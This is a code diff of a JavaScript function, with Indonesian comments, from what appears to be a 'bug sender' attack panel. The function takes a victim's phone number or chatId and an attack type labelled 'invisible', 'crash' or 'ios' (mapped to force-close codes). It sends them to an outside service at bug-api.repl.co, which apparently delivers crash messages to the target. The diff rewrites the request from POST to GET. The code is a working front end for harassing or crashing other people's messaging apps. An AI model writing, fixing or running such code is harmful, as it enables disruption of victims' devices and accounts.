@@ -185,26 +185,30 @@
 
     // Fungsi Kirim Bug + FETCH API
     async function kirim(tipe) {
-      const target = document.getElementById("target").value.trim();
-      if (!target) return alert("Masukkan nomor terlebih dahulu!");
-
-      try {
-        const res = await fetch("https://bug-api.repl.co/api", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({ target: target, type: tipe })
-        });
-
-        if (!res.ok) throw new Error("Gagal kirim bug");
-
-        const result = await res.json();
-        alert(`✅ Bug "${tipe}" berhasil dikirim ke ${target}\n\nRespon: ${result.message || 'Sukses'}`);
-      } catch (err) {
-        console.error(err);
-        alert("❌ Gagal mengirim bug. Cek koneksi atau API.");
-      }
+  const target = document.getElementById("target").value.trim();
+  if (!target) return alert("Masukkan nomor terlebih dahulu!");
+  
+  const typeMap = {
+    invisible: "1",
+    crash: "2",
+    ios: "1" // Misalnya ios pakai fc1 juga
+  };
+  
+  const type = typeMap[tipe] || "1";
+  
+  try {
+    const res = await fetch(`https://bug-api.repl.co/radzzoffc?chatId=${target}&type=${type}`);
+    const result = await res.json();
+    
+    if (result.success) {
+      alert(`✅ Bug "${tipe}" berhasil dikirim ke ${target}`);
+    } else {
+      alert("❌ Gagal mengirim bug: " + (result.error || "Unknown error"));
+    }
+  } catch (err) {
+    console.error(err);
+    alert("❌ Gagal kirim. Periksa koneksi atau API.");
+  }
     }
 
     // Fungsi Login
